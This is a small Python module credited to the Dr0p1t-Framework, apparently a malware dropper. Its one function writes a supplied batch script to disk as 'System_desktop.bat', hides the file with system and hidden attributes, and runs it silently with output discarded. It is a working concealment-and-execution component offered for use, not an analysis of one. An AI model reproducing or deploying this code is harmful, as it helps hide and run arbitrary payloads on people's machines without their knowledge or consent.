#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This module aims to run batchfile scripts (bat)
#Start
def F2215(tobe):
    f = open("System_desktop.bat","w")
    f.write(tobe)
    f.close()
    xxx = subprocess.Popen("attrib +s +h System_desktop.bat",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    blah = subprocess.Popen("System_desktop.bat > nul",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)

F2215(Bat_Script_Data)
